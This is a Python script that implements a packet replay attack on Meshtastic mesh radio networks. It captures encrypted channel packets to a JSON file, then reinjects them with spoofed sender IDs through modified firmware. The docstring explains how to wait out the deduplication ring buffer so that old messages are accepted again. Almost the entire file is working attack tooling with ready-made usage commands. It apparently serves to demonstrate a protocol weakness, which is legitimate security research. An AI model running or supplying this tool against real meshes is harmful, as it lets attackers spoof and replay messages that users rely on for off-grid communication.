#!/usr/bin/env -S uv run
# /// script
# requires-python = ">=3.10"
# dependencies = [
#   "meshtastic",
# ]
# ///
"""
replay.py — Meshtastic packet replay attack

Captures encrypted mesh packets and replays them later. Demonstrates that
Meshtastic has no replay protection on PSK channel messages: a packet seen
by a recipient node can be reinjected and displayed again — without knowing
the PSK or plaintext.

HOW REPLAY WORKS:
  The packet deduplication filter (PacketHistory) stores seen {sender, id}
  pairs in a fixed-size ring buffer (MAX_NUM_NODES * 2 entries). When the
  buffer fills, oldest entries are evicted. After eviction, the same
  {sender, id} pair is accepted again.

  At DEF CON with hundreds of active nodes and high traffic volume, the buffer
  fills quickly — replay windows of only a few minutes in practice.

  Replay also succeeds immediately on nodes that were not in range for the
  original broadcast (or that missed it for any reason).

Requires:
  - Capture mode: any connection (stock or evil firmware)
  - Replay mode: evil firmware with EVIL_ALLOW_FROM_OVERRIDE=1

Usage:
    # Capture mode: listen and save encrypted packets to replay.json
    python tools/replay.py --port /dev/cu.SLAB_USBtoUART --capture replay.json

    # Replay mode: reinject saved packets
    python tools/replay.py --port /dev/cu.SLAB_USBtoUART --evil \\
        --replay replay.json

    # Replay with a delay (wait for dedup window to clear)
    python tools/replay.py --port /dev/cu.SLAB_USBtoUART --evil \\
        --replay replay.json --wait 600

    # Replay only text messages, first 5
    python tools/replay.py --port /dev/cu.SLAB_USBtoUART --evil \\
        --replay replay.json --text-only --count 5

    # Capture + immediate replay in one session (same dedup window — tests
    # injection path; use --wait to exceed the dedup window for true replay)
    python tools/replay.py --port /dev/cu.SLAB_USBtoUART --evil \\
        --capture replay.json --replay replay.json --wait 60
"""

import argparse
import datetime
import json
import os
import signal
import sys
import time

from pubsub import pub

from common import add_connection_args, build_interface, evil_mode, print_banner


# ─────────────────────────────────────────────────────────────────────────────
# Capture
# ─────────────────────────────────────────────────────────────────────────────

class PacketCapturer:
    def __init__(self, output_path: str, channel: int | None, text_only: bool, max_capture: int):
        self.output_path  = output_path
        self.channel      = channel
        self.text_only    = text_only
        self.max_capture  = max_capture
        self.packets: list[dict] = []
        self.count        = 0
        self.running      = True

    def on_receive(self, packet, interface):
        if not self.running:
            return
        if self.max_capture > 0 and self.count >= self.max_capture:
            return

        raw = packet.get("raw")
        from_node  = packet.get("from", 0)
        to_node    = packet.get("to", 0)
        packet_id  = packet.get("id", 0)
        channel    = packet.get("channel", 0)
        hop_limit  = packet.get("hopLimit", 3)
        hop_start  = packet.get("hopStart", 3)

        if self.channel is not None and channel != self.channel:
            return

        decoded     = packet.get("decoded", {})
        portnum     = decoded.get("portnum", "")
        text        = decoded.get("text")

        if self.text_only and text is None:
            return

        # Extract raw encrypted bytes if the library hasn't decoded the packet
        encrypted_hex = None
        if raw is not None:
            enc = getattr(raw, "encrypted", b"")
            if enc:
                encrypted_hex = enc.hex()

        entry = {
            "ts":            datetime.datetime.now().isoformat(),
            "from":          f"0x{from_node:08x}",
            "to":            f"0x{to_node:08x}",
            "id":            f"0x{packet_id:08x}",
            "channel":       channel,
            "hop_limit":     hop_limit,
            "hop_start":     hop_start,
            "portnum":       str(portnum),
            "text":          text,
            "encrypted_hex": encrypted_hex,
        }
        self.packets.append(entry)
        self.count += 1

        ts = datetime.datetime.now().isoformat(timespec="milliseconds")
        enc_str = f"enc={encrypted_hex[:16]}..." if encrypted_hex else "decoded"
        txt_str = f"  text='{text}'" if text else ""
        print(f"  [{self.count:>4}] {ts}  !{from_node:08x}→!{to_node:08x}  "
              f"id=0x{packet_id:08x}  ch={channel}  {enc_str}{txt_str}")

    def save(self):
        with open(self.output_path, "w") as f:
            json.dump(self.packets, f, indent=2)
        print(f"[*] Saved {len(self.packets)} packet(s) to {self.output_path}")


# ─────────────────────────────────────────────────────────────────────────────
# Replay
# ─────────────────────────────────────────────────────────────────────────────

def load_capture(path: str) -> list[dict]:
    with open(path) as f:
        return json.load(f)


def replay_packet(iface, entry: dict, hop_limit: int):
    """
    Reinject a captured packet.

    If the entry has raw encrypted bytes, sends them with encrypted_tag so
    the firmware won't re-encrypt (Router.cpp:356). This preserves the exact
    ciphertext — the recipient decrypts to the original plaintext.

    If only decoded text is available, falls back to sending as a spoofed
    text message (re-encrypted with a new nonce — content preserved but
    different ciphertext; still demonstrates source-ID replay).
    """
    import meshtastic.protobuf.mesh_pb2 as mesh_pb2
    import meshtastic.protobuf.portnums_pb2 as portnums_pb2

    from_node  = int(entry["from"], 16)
    to_node    = int(entry["to"], 16)
    packet_id  = int(entry["id"], 16)
    channel    = entry.get("channel", 0)
    enc_hex    = entry.get("encrypted_hex")
    text       = entry.get("text")

    packet = mesh_pb2.MeshPacket()
    setattr(packet, "from", from_node)
    packet.to        = to_node
    packet.id        = packet_id   # same ID → same nonce → same dedup key
    packet.channel   = channel
    packet.hop_limit = hop_limit
    packet.hop_start = hop_limit
    packet.want_ack  = False

    if enc_hex:
        # True ciphertext replay — exact bytes, correct nonce, no PSK needed
        packet.encrypted = bytes.fromhex(enc_hex)
        mode = "ciphertext"
    elif text is not None:
        # Fallback: spoofed text replay (re-encrypted with new nonce if ID differs)
        data = mesh_pb2.Data()
        data.portnum  = portnums_pb2.PortNum.TEXT_MESSAGE_APP
        data.payload  = text.encode("utf-8")
        packet.decoded.CopyFrom(data)
        mode = "decoded-text"
    else:
        return False, "no-payload"

    toRadio = mesh_pb2.ToRadio()
    toRadio.packet.CopyFrom(packet)
    iface._sendToRadio(toRadio)
    return True, mode


# ─────────────────────────────────────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="Meshtastic packet replay attack",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__.split("Usage:")[0].strip(),
    )

    add_connection_args(parser, require_port=False)

    # Mode
    parser.add_argument("--capture", metavar="FILE",
                        help="Capture mode: listen and save packets to FILE (JSON)")
    parser.add_argument("--replay", metavar="FILE",
                        help="Replay mode: load and reinject packets from FILE (JSON)")

    # Capture filters
    cap_grp = parser.add_argument_group("Capture options")
    cap_grp.add_argument("--channel", type=int, default=None,
                         help="Capture only this channel index (default: all)")
    cap_grp.add_argument("--text-only", action="store_true",
                         help="Capture/replay only text messages")
    cap_grp.add_argument("--max-capture", type=int, default=0,
                         help="Stop capture after N packets (0=unlimited, default: 0)")

    # Replay options
    rep_grp = parser.add_argument_group("Replay options")
    rep_grp.add_argument("--wait", type=float, default=0,
                         help="Seconds to wait before replaying (default: 0). "
                              "Use ≥600 to exceed the dedup window in sparse meshes.")
    rep_grp.add_argument("--interval", type=float, default=1.0,
                         help="Seconds between replayed packets (default: 1.0)")
    rep_grp.add_argument("--count", type=int, default=0,
                         help="Replay only first N packets from file (0=all, default: 0)")
    rep_grp.add_argument("--hop-limit", type=int, default=3, choices=range(0, 8),
                         metavar="{0..7}", help="Hop limit for replayed packets (default: 3)")

    args = parser.parse_args()

    if not args.capture and not args.replay:
        parser.error("Specify --capture FILE and/or --replay FILE.")

    if not (args.port or args.host) and not (args.capture and not args.replay):
        # Need a connection if replaying or if only capturing
        if not (args.port or args.host):
            parser.error("--port or --host required to connect to a node.")

    # ── Connect ────────────────────────────────────────────────────────────────
    iface = None
    if args.port or args.host:
        print("[*] Connecting...")
        iface = build_interface(args)
        time.sleep(2)
        print_banner(iface, args, "replay.py — packet replay attack")

    # ── Capture phase ──────────────────────────────────────────────────────────
    capturer = None
    if args.capture:
        capturer = PacketCapturer(
            output_path=args.capture,
            channel=args.channel,
            text_only=args.text_only,
            max_capture=args.max_capture,
        )
        pub.subscribe(capturer.on_receive, "meshtastic.receive")

        print(f"[*] Capturing packets → {args.capture}")
        if args.channel is not None:
            print(f"[*] Filter: channel {args.channel} only")
        if args.text_only:
            print("[*] Filter: text messages only")
        print("[*] Ctrl+C to stop capture" + (" and proceed to replay" if args.replay else ""))
        print()

        running = True

        def handle_sigint(sig, frame):
            nonlocal running
            capturer.running = False
            running = False

        signal.signal(signal.SIGINT, handle_sigint)

        while running and (args.max_capture == 0 or capturer.count < args.max_capture):
            # If we also have a replay file, don't block — proceed after capture finishes
            if not args.replay:
                time.sleep(0.1)
            else:
                time.sleep(0.1)

        capturer.save()
        print()

    # ── Wait phase ─────────────────────────────────────────────────────────────
    if args.replay and args.wait > 0:
        print(f"[*] Waiting {args.wait:.0f}s before replay (dedup window clearance)...")
        waited = 0.0
        while waited < args.wait:
            time.sleep(min(10.0, args.wait - waited))
            waited += 10.0
            remaining = args.wait - waited
            if remaining > 0:
                print(f"[*]   {remaining:.0f}s remaining...")
        print("[*] Wait complete.")
        print()

    # ── Replay phase ───────────────────────────────────────────────────────────
    if args.replay:
        if not evil_mode(args):
            print("[!] WARNING: --evil not set. Replay requires EVIL_ALLOW_FROM_OVERRIDE firmware.")
            print("[!] Without it, the firmware zeroes the 'from' field and uses its own node ID.")
            print()

        if not os.path.exists(args.replay):
            print(f"[!] Replay file not found: {args.replay}")
            sys.exit(1)

        packets = load_capture(args.replay)
        if args.text_only:
            packets = [p for p in packets if p.get("text") is not None]
        if args.count > 0:
            packets = packets[:args.count]

        print(f"[*] Replaying {len(packets)} packet(s) from {args.replay}")
        print(f"[*] Interval: {args.interval}s  hop_limit: {args.hop_limit}")
        print()

        replayed = 0
        skipped  = 0
        start    = time.time()

        for i, entry in enumerate(packets):
            try:
                ok, mode = replay_packet(iface, entry, args.hop_limit)
                if ok:
                    replayed += 1
                    txt = entry.get("text", "")
                    enc = "✓ ciphertext" if mode == "ciphertext" else "~ decoded-text"
                    print(f"  [{replayed:>4}] from={entry['from']}  id={entry['id']}  "
                          f"ch={entry.get('channel',0)}  {enc}"
                          + (f"  text='{txt}'" if txt else ""))
                else:
                    skipped += 1
                    print(f"  [SKIP] {entry['from']} id={entry['id']} ({mode})")
            except Exception as e:
                print(f"  [ERROR] {entry.get('from','?')} id={entry.get('id','?')}: {e}")
                skipped += 1

            if i < len(packets) - 1:
                time.sleep(args.interval)

        elapsed = time.time() - start
        print(f"\n[*] Done. Replayed {replayed}, skipped {skipped} in {elapsed:.1f}s")

    if iface:
        iface.close()


if __name__ == "__main__":
    main()
